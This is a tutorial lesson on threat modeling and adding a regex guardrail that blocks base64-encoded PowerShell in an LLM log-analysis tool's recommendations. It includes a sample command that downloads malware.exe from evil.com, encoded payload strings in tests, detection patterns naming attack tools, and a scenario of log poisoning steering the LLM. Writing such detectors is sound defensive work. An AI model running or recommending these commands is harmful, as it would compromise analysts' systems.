# 🛠️ **Lesson 07: Hands-On - Add a Custom Security Pattern**

This is your first **hands-on modification** lesson! You'll add a new security validation rule to [src/security.py](../src/security.py), test it, and understand how to explain your changes in an interview.

**Prerequisites:** Complete Lessons 01-06 (especially Lesson 05 on validation)

---

## **⚠️ IMPORTANT: Protect Your Code First!**

This lesson **modifies your actual project files**. Let's use Git to practice safely!

### **Step 0: Create a Practice Branch**

Open a terminal in your project folder and run:

```powershell
# 1. Make sure your current work is saved
git status  # Check if you have unsaved changes

# If you have changes, save them:
git add .
git commit -m "Save work before lessons"

# 2. Create a new branch for practicing lessons
git checkout -b lessons-practice
```

**What just happened?**
- `git status` - Shows what files have changed (if any)
- `git add .` - Stages all changes for commit
- `git commit -m "..."` - Saves a snapshot with a message
- `git checkout -b lessons-practice` - Creates AND switches to a new branch called "lessons-practice"

**Think of it like:**
- Your `master` branch = Production code (safe, untouched)
- Your `lessons-practice` branch = Sandbox (play here safely)

**You're now on the practice branch!** Any changes you make won't affect your main code.

### **After the Lesson: Choose Your Path**

**Option A: Keep the changes (they're good!)**
```powershell
# Switch back to master
git checkout master

# Bring the changes over
git merge lessons-practice

# Delete the practice branch (no longer needed)
git branch -d lessons-practice
```

**Option B: Discard the changes (just learning)**
```powershell
# Switch back to master
git checkout master

# Delete the practice branch and all changes
git branch -D lessons-practice
```

**Option C: Keep the branch for later**
```powershell
# Switch back to master
git checkout master

# The lessons-practice branch still exists with your changes
# You can switch back anytime: git checkout lessons-practice
```

---

## **🎯 Learning Goals**

By the end of this lesson, you'll be able to:
- ✅ **Perform threat modeling** to identify security risks in LLM outputs
- ✅ Write effective regex patterns for real-world attack detection (base64 PowerShell)
- ✅ Extend guardrails beyond authority claims to **content validation**
- ✅ Modify YOUR validation code safely
- ✅ Test your new pattern with positive and negative cases
- ✅ **Explain threat modeling and implementation to interviewers**
- ✅ Understand the trade-offs (false positives vs false negatives)

**Why this lesson matters:**

**🔒 Real-world SOC relevance:**
- EVTX logs contain PowerShell commands constantly (execution, scripts, encoded payloads)
- Base64-encoded PowerShell is a **common attack obfuscation technique** used by Mimikatz, Covenant, Empire, and other post-exploitation frameworks
- Your existing 5 patterns block authority claims ("I have blocked"), but don't validate **recommended actions**
- **New threat:** What if LLM recommends running malicious encoded commands?

**💼 Interview demonstration:**
- Shows **threat modeling** skills (identifying what could go wrong)
- Demonstrates **complex regex** (more impressive than simple string matching)
- Proves you understand **defense-in-depth** (multiple guardrail categories)
- Different validation category: Content safety (not just structural/policy)
- Real attack technique awareness (not just theoretical patterns)

---

## **📚 The Scenario**

You're in an interview and the interviewer says:

> "I see you have 5 prohibited patterns in your security validation - all focused on blocking authority claims like 'I have remediated' or 'This is definitely malicious.' That's good for preventing the LLM from overstepping its role. But what about **content validation**? What if the LLM recommends a malicious action in the 'recommended_next_steps' field? Walk me through your **threat modeling process** and show me how you'd add protection against that."

**Your goal:** Demonstrate threat modeling, add a content validation pattern, test it, and explain your reasoning.

**Why this scenario is realistic:**
- Real SOC analysts work with PowerShell commands daily in EVTX logs
- Attackers use base64 encoding to evade detection (Mimikatz, Empire, Covenant)
- LLM could hallucinate and recommend executing encoded payloads
- Interviewers want to see if you think beyond obvious threats

---

## **🔍 Step 1: Threat Modeling - Understanding the Risk**

### **The Threat Modeling Process**

**Step 1: Identify the asset**
- What are we protecting? → Analysts who might execute LLM recommendations

**Step 2: Identify potential threats**
- **Current protection:** 5 patterns block authority claims (LLM claiming to take action)
- **Gap identified:** No validation of recommended actions themselves
- **Threat scenario:** LLM recommends malicious command in `recommended_next_steps`

**Step 3: Analyze attack vectors**
- Attacker poisons logs with malicious payloads
- LLM analyzes poisoned logs, suggests running encoded command
- Analyst trusts recommendation, executes malicious PowerShell

**Step 4: Select mitigation**
- Add pattern to detect base64-encoded PowerShell commands
- Block recommendations containing obfuscated execution

### **Why Base64-Encoded PowerShell?**

Attackers often encode malicious PowerShell to evade detection:

```powershell
# Normal PowerShell (easily detected)
powershell.exe -Command "Invoke-WebRequest http://evil.com/malware.exe"

# Base64-encoded (harder to detect)
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU=
```

**Why attackers use this:**
- Bypasses simple keyword detection
- Avoids quote escaping issues
- Can hide in logs as "legitimate" encoded data

**Your validation should catch recommendations like:**
- "Run `powershell -enc SQBuAHYAbw...` to investigate"
- "Execute `pwsh -EncodedCommand VwByAGkAdABlA...`"

---

## **🧪 Step 2: Designing the Regex Pattern**

### **What to match:**

We want to detect:
1. PowerShell executable names: `powershell`, `pwsh`, `powershell.exe`, `pwsh.exe`
2. Encoding flags: `-enc`, `-encodedcommand`, `-e` (short form), `-ec`
3. Followed by base64-like strings

### **The Regex Pattern**

```regex
(?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}
```

**Let's break it down:**

- `(?i)` - Case-insensitive (matches "PowerShell" or "POWERSHELL")
- `\b` - Word boundary (prevents matching "notpowershell")
- `(powershell|pwsh)` - Either "powershell" or "pwsh"
- `(\.exe)?` - Optional ".exe" extension
- `\s+` - One or more whitespace characters
- `(-enc|-encodedcommand|-e|-ec)` - Encoding flags (all valid aliases)
- `\s+` - More whitespace
- `[A-Za-z0-9+/=]{20,}` - Base64 characters, minimum 20 chars (ensures it's encoded data)

### **Testing the Regex**

Let's test it matches what we expect:

**✓ Should match:**
- `powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYw==`
- `pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==`
- `POWERSHELL.EXE -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==`

**✗ Should NOT match:**
- `powershell -Command Get-Process` (not encoded)
- `Run powershell` (no encoding flag)
- `The word powershell appears here` (no command structure)

---

## **💻 Step 3: Modifying YOUR Code**

### **Open src/security.py**

1. Open [src/security.py](../src/security.py) in VS Code
2. Find the `PROHIBITED_PATTERNS` list (lines 8-18)
3. You'll see 5 existing patterns

### **Current Code (Lines 7-13):**

```python
PROHIBITED_PATTERNS = [
    r"I have (blocked|removed|deleted|remediated)",
    r"This (is|was) (benign|malicious|definitely)",
    r"Action (taken|executed|completed|performed)",
    r"System (modified|updated|patched|fixed)",
    r"(Confirmed|Certain|Guaranteed) that",
]
```

**What these patterns block:**
- Pattern 1: False action claims ("I have blocked the attack")
- Pattern 2: Definitive determinations ("This is definitely malicious")
- Pattern 3: Execution claims ("Action taken to remediate")
- Pattern 4: System modification claims ("System patched successfully")
- Pattern 5: False certainty ("Confirmed that this is an attack")

**Why these exist:** LLM is an analyst assistant, NOT an autonomous agent. It should NEVER claim to have taken actions or made final determinations.

---

### **Your Task: Add the New Pattern**

**Add a 6th pattern to the list:**

```python
PROHIBITED_PATTERNS = [
    r"I have (blocked|removed|deleted|remediated)",
    r"This (is|was) (benign|malicious|definitely)",
    r"Action (taken|executed|completed|performed)",
    r"System (modified|updated|patched|fixed)",
    r"(Confirmed|Certain|Guaranteed) that",
    r"(?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}",  # NEW!
]
```

**💡 Best Practice:** Add a comment explaining what the pattern does!

```python
PROHIBITED_PATTERNS = [
    r"I have (blocked|removed|deleted|remediated)",
    r"This (is|was) (benign|malicious|definitely)",
    r"Action (taken|executed|completed|performed)",
    r"System (modified|updated|patched|fixed)",
    r"(Confirmed|Certain|Guaranteed) that",
    r"(?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}",  # NEW: Base64-encoded PowerShell
]
```

**What changed:**
- Added 6th pattern targeting base64-encoded PowerShell commands
- This catches malicious recommendations like "Run powershell -enc <base64_payload>"
- Different threat category: Content validation (not just authority claims)

---

### **Save the File**

Press **Ctrl+S** to save [src/security.py](../src/security.py).

**You just modified YOUR production code!** 🎉

---

## **🧪 Step 4: Testing Your New Pattern**

### **Test 1: Create a Test Script**

Create a file called `test_new_pattern.py` in your project root:

```python
"""Test the new base64 PowerShell pattern."""

import json
from src.schemas import AnalysisOutput
from src.security import validate_output

# Test Case 1: Clean recommendation (should pass)
clean_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Review process tree for suspicious activity",
        "Check authentication logs for failed logins"
    ],
    "confidence": 0.85
}

validated = AnalysisOutput.model_validate(clean_data)
# Convert to JSON string (how main.py calls it)
response_text = json.dumps(clean_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 1 (Clean): Valid={is_valid}, Error={error_msg}")
assert is_valid == True, "Clean data should pass!"

# Test Case 2: Base64-encoded PowerShell (should fail)
encoded_ps_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU="
    ],
    "confidence": 0.85
}

validated = AnalysisOutput.model_validate(encoded_ps_data)
response_text = json.dumps(encoded_ps_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 2 (Base64 PS): Valid={is_valid}, Error={error_msg}")
if not is_valid:
    print(f"  → Blocked! Error: {error_msg}")
assert is_valid == False, "Base64 PowerShell should be blocked!"

# Test Case 3: Multiple encoding flags (should fail)
test_cases = [
    "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
    "POWERSHELL -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
    "powershell.exe -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
]

for idx, test_cmd in enumerate(test_cases, 3):
    test_data = {
        "status": "success",
        "findings": [],
        "hypotheses": [],
        "indicators_of_compromise": [],
        "recommended_next_steps": [test_cmd],
        "confidence": 0.85
    }
    
    response_text = json.dumps(test_data, ensure_ascii=False)
    is_valid, error_msg = validate_output(response_text)
    print(f"Test {idx}: Valid={is_valid}")
    assert is_valid == False, f"Test case {idx} should be blocked!"

# Test Case 4: Normal PowerShell (should pass - not base64)
normal_ps_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Run powershell Get-Process to check for suspicious processes"
    ],
    "confidence": 0.85
}

response_text = json.dumps(normal_ps_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 4 (Normal PS): Valid={is_valid}, Error={error_msg}")
assert is_valid == True, "Normal PowerShell commands should pass!"

print("\n✅ All tests passed! Your new pattern works correctly.")
```

**Key points about the API:**
- `validate_output()` takes a **string** (JSON text), not an AnalysisOutput object
- Returns a **tuple**: `(bool, Optional[str])` - (is_valid, error_message)
- This matches how main.py calls it: `validate_output(json.dumps(analysis_data, ensure_ascii=False))`

---

### **Run the Test**

```powershell
# Activate virtual environment
.venv\Scripts\Activate

# Run the test
python test_new_pattern.py
```

**Expected output:**
```
Test 1 (Clean): Valid=True, Error=None
Test 2 (Base64 PS): Valid=False, Error=Prohibited pattern detected: ...
  → Blocked! Error: Prohibited pattern detected: (?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}
Test 3: Valid=False
Test 4: Valid=True, Error=None

✅ All tests passed! Your new pattern works correctly.
```

**🎉 Your new security pattern is working!**

---

## **🧪 Step 5: Understanding Integration with main.py**

### **How Your Pattern Gets Called**

Let's trace the execution flow in [src/main.py](../src/main.py) (lines 119-123):

```python
# Phase 2: LLM returns dict
analysis_data = analyze_events(events, model=args.model)

# Phase 3A: Pydantic validates structure
analysis = _validate_analysis_output(analysis_data)

# Phase 3B: Security validates content (YOUR NEW PATTERN RUNS HERE!)
policy_valid, policy_error = validate_output(
    json.dumps(analysis_data, ensure_ascii=False)  # ← Converts dict to JSON string
)
if not policy_valid:
    LOGGER.error("Security policy violation: %s", policy_error)
    analysis = _build_error_analysis("validation_error", policy_error)
```

**What happens:**
1. LLM returns analysis_data dict
2. Pydantic validates structure (fields exist, types correct)
3. **Your security.py validates content** (no prohibited patterns)
4. If pattern matches → replace analysis with error object → pipeline continues → report/DB/exit 1

**Key insight:** Security validation happens AFTER Pydantic, on the re-stringified dict. This is why `validate_output()` takes a string, not an object.

---

## **🧪 Step 6: Test with Real Pipeline**

Let's ensure the full pipeline still works with your change:


```powershell
# Run the full analysis (output to file; filename is set by the program)
python -m src.main --input data/evtx_parsed --model gpt-4o-mini --output file
```

**Note:** The `--output` argument only accepts `console` or `file` (not a custom filename). When you use `--output file`, the report will be saved to the default location (usually in the `reports/` directory, e.g., `reports/analysis_<runid>.txt`).

**Expected behavior:**
- Analysis runs successfully
- No violations (assuming GPT doesn't recommend base64 PowerShell)
- Report generated in the `reports/` directory
- Database updated

**If GPT *did* return a base64 recommendation, you'd see:**
```
ERROR Security validation failed: [{'field': 'recommended_next_steps[2]', 'pattern': '(?i)\\b(powershell|pwsh)...', 'value_excerpt': 'Run powershell -enc ...'}]
```

**And the pipeline would stop!** This is correct behavior - protecting you from malicious output.

---

## **📊 Step 6: Understanding Trade-offs**

### **False Positives vs False Negatives**

**False Positive** = Legitimate content blocked incorrectly
- Example: "Analyze the string `powershell -enc ABC123...` for encoding type"
- Your pattern blocks this even though it's just discussing the technique

**False Negative** = Malicious content not detected
- Example: Attacker uses `powershell -en` (shortened flag not in your pattern)
- Your pattern misses this variant

### **Your Pattern's Trade-off**

**Current design:**
```regex
(-enc|-encodedcommand|-e|-ec)
```

**Pros:**
- ✅ Catches common flags (`-enc`, `-e`, `-ec`, `-encodedcommand`)
- ✅ Low false negative rate (most variants covered)

**Cons:**
- ❌ `-e` is very short - might catch unrelated things (false positives)
- ❌ Doesn't catch shortened variants like `-en`, `-enco`, etc.

---

### **Improvement Options**

**Option 1: Be more restrictive (reduce false positives)**
```regex
(-enc|-encodedcommand|-ec)  # Remove -e (too short)
```

**Option 2: Be more permissive (reduce false negatives)**
```regex
(-enc.*|-e\s)  # Match -enc followed by anything, or -e with space
```

**Option 3: Require longer base64 strings**
```regex
[A-Za-z0-9+/=]{50,}  # Increase from 20 to 50 chars
```

**Which is best?** Depends on your threat model:
- **High-security environment:** Reduce false negatives (catch more variants)
- **Low false-positive tolerance:** Be more restrictive (block only obvious cases)

**For this project:** The current pattern is a good balance!

---

## **💬 Interview Explanation: How to Present This**

### **The Setup**

Interviewer: *"Walk me through how you'd add a new security pattern. Start with your threat modeling process."*

### **Your Response (Step-by-Step)**

**Step 1: Threat Modeling**
> "First, I perform threat modeling to identify the risk. I start by asking: What's the asset? In this case, it's SOC analysts who might execute recommendations from my tool. What's the threat? LLM could recommend malicious actions in the recommended_next_steps field. What's the attack vector? Attackers could poison EVTX logs with malicious payloads, the LLM analyzes them and suggests running encoded commands, and an analyst trusts the recommendation. For base64-encoded PowerShell specifically, this is a common evasion technique - attackers use it to bypass keyword detection and hide payloads. Tools like Mimikatz, Empire, and Covenant all leverage this. My existing 5 patterns block authority claims like 'I have blocked this,' but they don't validate the recommended actions themselves. That's a gap."

**Step 2: Pattern Design**
> "I'd design a regex pattern to detect it. My pattern matches the PowerShell executable - both 'powershell' and 'pwsh' with optional .exe - followed by encoding flags like -enc, -encodedcommand, -e, or -ec, then a base64-like string of at least 20 characters. The pattern is case-insensitive to catch variants like POWERSHELL or PowerShell."

**Step 3: Implementation**
> "I'd add it to the PROHIBITED_PATTERNS list in src/security.py at line 13, right after the existing 5 patterns. I'd include an inline comment explaining it blocks base64-encoded PowerShell commands for future maintainability."

**Step 4: Testing**
> "I'd write comprehensive tests covering positive cases - variants like pwsh.exe -EncodedCommand, POWERSHELL -e, etc. - and negative cases like normal PowerShell commands without encoding flags. I'd also run the full pipeline to ensure no regressions."

**Step 5: Trade-offs**
> "I'd document the trade-off between false positives and false negatives. The -e flag is aggressive since it's very short, but it's a valid alias for -EncodedCommand. I chose to include it because the risk of missing malicious content outweighs occasional false positives in this security context. The 20-character minimum for base64 helps reduce false positives from short flags like -e abc."

**Step 6: Monitoring**
> "In production, I'd add telemetry to track how often this pattern triggers, review violations to tune the pattern if needed, and potentially implement an allowlist for known-safe encoded commands if false positives become problematic."

---

## **🔍 Deep Dive: How Regex Matching Works**

Let's trace through an example:

**Input string:**
```
"Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0"
```

**Your pattern:**
```regex
(?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}
```

**Matching process:**

1. `(?i)` - Enable case-insensitive mode
2. `\b` - Word boundary before "powershell" ✓
3. `(powershell|pwsh)` - Matches "powershell" ✓
4. `(\.exe)?` - Optional, not present here ✓
5. `\s+` - Matches space " " ✓
6. `(-enc|-encodedcommand|-e|-ec)` - Matches "-enc" ✓
7. `\s+` - Matches space " " ✓
8. `[A-Za-z0-9+/=]{20,}` - Matches "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0" (45 chars) ✓

**Result: MATCH!** → Violation logged, validation fails.

---

## **🎯 Key Takeaways**

### **You Just Learned:**
- ✅ How to identify security threats through threat modeling
- ✅ How to design effective regex patterns with trade-offs in mind
- ✅ How to modify production validation code safely
- ✅ How to write comprehensive tests (positive + negative cases)
- ✅ How to explain changes to technical interviewers
- ✅ How to evaluate false positive vs false negative trade-offs

### **Interview Skills:**
- ✅ Articulate threat modeling process
- ✅ Explain regex pattern design choices
- ✅ Discuss testing strategies
- ✅ Understand security trade-offs
- ✅ Demonstrate thoughtful code modification

---

## **🚀 Extension Challenges**

Want to practice more? Try these:

### **Challenge 1: Add Pattern for Hex-Encoded Commands**

Attackers also use hex encoding:
```powershell
powershell -Command ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...')))
```

**Pattern to detect `[Convert]::FromBase64String`:**
```regex
r"(?i)\[Convert\]::\s*FromBase64String"
```

Add this as a 7th pattern and test it!

---

### **Challenge 2: Add Pattern for Known Malware Hashes**

Block findings that reference known malware:
```regex
r"(?i)\b(mimikatz|cobalt\s?strike|meterpreter|empire|covenant)\b"
```

**Why?** If GPT hallucinates and includes malware names, you don't want that in your report!

---

### **Challenge 3: Add Pattern for Excessive Regex Complexity**

Prevent ReDoS (Regular Expression Denial of Service) in recommendations:
```regex
r"(?i)regex[:\s]+.*(\.\*){3,}"
```

**Detects:** Recommendations like "Use regex: `.*.*.*.*`" which could cause ReDoS.

---

## **📝 Quick Reference**

### **What You Modified:**
- **File:** [src/security.py](../src/security.py)
- **Line:** 13 (added 6th pattern)
- **Change:** Added base64-encoded PowerShell detection

### **Your New Pattern:**
```python
r"(?i)\b(powershell|pwsh)(\.exe)?\s+(-enc|-encodedcommand|-e|-ec)\s+[A-Za-z0-9+/=]{20,}"
```

### **Testing Strategy:**
1. ✓ Positive cases (should block): Multiple encoding flag variants
2. ✓ Negative cases (should pass): Normal PowerShell, unrelated text
3. ✓ Full pipeline test: Ensure no regressions

### **Trade-offs:**
- **False Positives:** Legitimate discussion of encoded commands
- **False Negatives:** Shortened flags not in pattern
- **Balance:** Current design favors security over convenience

---

## **🔗 Next Steps**

You've completed your first code modification! Continue with:
- **Lesson 08**: Hands-On - Customize Report Format
- **Lesson 09**: Debugging Bootcamp
- **Lesson 10**: Database Deep Dive (Advanced Queries)

You can now confidently modify security validation code and explain your changes in interviews! 🛡️
